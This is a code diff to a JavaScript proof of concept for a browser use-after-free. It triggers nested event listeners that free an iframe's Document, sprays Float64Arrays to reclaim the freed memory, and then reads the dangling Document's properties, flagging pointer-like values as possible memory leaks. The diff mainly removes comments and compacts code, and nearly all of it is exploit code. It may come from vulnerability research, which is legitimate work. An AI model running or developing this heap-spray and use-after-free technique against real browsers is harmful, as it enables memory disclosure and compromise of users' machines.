@@ -55,14 +55,13 @@ function triggerThirdListener() {
             }
             
             // Now spray with controlled data to reclaim the freed slot
-            // Use Float64Array with marker values
             log("[L1] Spraying Float64Arrays to reclaim freed Document...");
             var spray = [];
             for (var i = 0; i < 1000; i++) {
                 var buf = new ArrayBuffer(256);
                 var f64 = new Float64Array(buf);
-                // Fill with marker pattern: 0xDEADBEEF + index
-                f64[0] = 1.1;  // Normal value
+                // Fill with markers
+                f64[0] = 1.1;  
                 f64[1] = 2.2;
                 f64[2] = 3.3;
                 f64[3] = 4.4;
@@ -70,11 +69,11 @@ function triggerThirdListener() {
             }
             log("[L1] Spray complete. 1000 Float64Arrays allocated.");
             
-            // Now throw to continue to next listener
+            // Throw to jump into the buffer structure
             throw {
                 line: 1,
                 column: 1,
-                sourceURL: 'X'.repeat(1024 * 1024)  // Small spray (1MB)
+                sourceURL: 'X'.repeat(1024 * 1024)  
             };
         });
         
@@ -87,15 +86,12 @@ function triggerThirdListener() {
         
         // ============================================================
         // LISTENER 3: Read freed Document properties
-        // This executes AFTER the throw — Document should be freed
-        // Access via f.contentDocument (NOT savedDoc)
         // ============================================================
         a.addEventListener('a', function() {
             log("[L3] Third listener executing — attempting to read freed Document...\n");
             
             var doc = null;
             
-            // Try to access the freed Document via f.contentDocument
             try {
                 doc = f.contentDocument;
                 if (doc) {
@@ -107,7 +103,6 @@ function triggerThirdListener() {
                 log("[L3] f.contentDocument access error: " + e.message,"er");
             }
             
-            // If we got a document, try reading properties
             if (doc) {
                 log("\n[L3] Reading Document properties...\n","hl");
                 
@@ -126,21 +121,16 @@ function triggerThirdListener() {
                     try {
                         var val = doc[props[i]];
                         var str = String(val);
-                        
-                        // Check for unusual values
                         var unusual = false;
                         
-                        // Check if it's a number that looks like a pointer
                         if (typeof val === "number" && val > 0x10000) {
                             unusual = true;
                             log("  [+] " + props[i] + " = " + val + " (0x" + val.toString(16) + ") ← POSSIBLE LEAK","hl");
                         }
-                        // Check if string contains hex-like patterns
                         else if (/[0-9a-f]{8,}/i.test(str) && str !== "[object HTMLDocument]") {
                             unusual = true;
                             log("  [+] " + props[i] + " = " + str + " ← UNUSUAL","hl");
                         }
-                        // Check if value changed from expected defaults
                         else if (props[i] === "nodeType" && val !== 9) {
                             unusual = true;
                             log("  [+] " + props[i] + " = " + val + " ← EXPECTED 9, GOT DIFFERENT","hl");
@@ -174,7 +164,6 @@ function triggerThirdListener() {
                     }
                 }
                 
-                // Try toString
                 log("\n[L3] toString checks:","hd");
                 try {
                     var ts = doc.toString();
@@ -186,7 +175,6 @@ function triggerThirdListener() {
                     log("  toString error: " + e.message,"er");
                 }
                 
-                // Try constructor
                 try {
                     var ctor = doc.constructor;
                     log("  constructor: " + ctor);
@@ -194,50 +182,14 @@ function triggerThirdListener() {
                     log("  constructor error: " + e.message,"er");
                 }
                 
-                // Try JSON.stringify
-                try {
-                    var json = JSON.stringify(doc);
-                    log("  JSON: " + json);
-                } catch(e) {
-                    log("  JSON error: " + e.message);
-                }
-                
-                // Try Object.keys
-                try {
-                    var keys = Object.keys(doc);
-                    log("  Object.keys: " + keys.join(", "));
-                } catch(e) {
-                    log("  Object.keys error: " + e.message);
-                }
-                
-                // Try getOwnPropertyNames
-                try {
-                    var names = Object.getOwnPropertyNames(doc);
-                    log("  getOwnPropertyNames: " + names.join(", "));
-                } catch(e) {
-                    log("  getOwnPropertyNames error: " + e.message);
-                }
-                
-                // Try prototype
-                try {
-                    var proto = Object.getPrototypeOf(doc);
-                    log("  prototype: " + proto);
-                } catch(e) {
-                    log("  prototype error: " + e.message);
-                }
-                
-                // Try accessing internal slots via Reflect
-                try {
-                    var ownKeys = Reflect.ownKeys(doc);
-                    log("  Reflect.ownKeys: " + ownKeys.join(", "));
-                } catch(e) {
-                    log("  Reflect.ownKeys error: " + e.message);
-                }
+                try { var json = JSON.stringify(doc); log("  JSON: " + json); } catch(e) { log("  JSON error: " + e.message); }
+                try { var keys = Object.keys(doc); log("  Object.keys: " + keys.join(", ")); } catch(e) { log("  Object.keys error: " + e.message); }
+                try { var names = Object.getOwnPropertyNames(doc); log("  getOwnPropertyNames: " + names.join(", ")); } catch(e) { log("  getOwnPropertyNames error: " + e.message); }
+                try { var proto = Object.getPrototypeOf(doc); log("  prototype: " + proto); } catch(e) { log("  prototype error: " + e.message); }
+                try { var ownKeys = Reflect.ownKeys(doc); log("  Reflect.ownKeys: " + ownKeys.join(", ")); } catch(e) { log("  Reflect.ownKeys error: " + e.message); }
                 
             } else {
                 log("[L3] No document to read — trying alternative access methods...","wr");
-                
-                // Try accessing f directly
                 try {
                     log("  f.tagName: " + f.tagName);
                     log("  f.parentNode: " + (f.parentNode ? f.parentNode.nodeName : "null"));
@@ -247,7 +199,6 @@ function triggerThirdListener() {
                 }
             }
             
-            // Summary
             log("\n[L3] Summary:","hd");
             var unusualCount = results.filter(function(r){return r.unusual}).length;
             log("  Total properties checked: " + results.length);
@@ -265,11 +216,9 @@ function triggerThirdListener() {
             log("\n=== Test Complete ===","mg");
         });
         
-        // Dispatch the event
         log("[*] Dispatching event...\n");
         b.dispatchEvent(new Event('a', { bubbles: true }));
         
-        // Check if we survived
         log("\n[+] Browser survived! No crash!","ok");
         
     } catch(e) {
